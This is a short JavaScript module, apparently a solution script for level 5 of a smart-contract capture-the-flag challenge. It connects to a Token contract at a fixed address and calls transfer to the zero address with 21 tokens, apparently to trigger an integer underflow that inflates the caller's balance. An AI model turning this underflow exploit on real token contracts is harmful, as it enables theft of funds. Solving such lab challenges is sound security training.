const level5 = async (Token) => {

    const targetAddress = '0x66c1f09af20972b525e683595a6fe572175e250f';
    const target = await Token.at(targetAddress);


    console.log(`Exploiting Level5 target ${targetAddress}...`);

    console.log('Calling transfer...');
    await target.transfer('0x0000000000000000000000000000000000000000', 21);
};

module.exports = level5;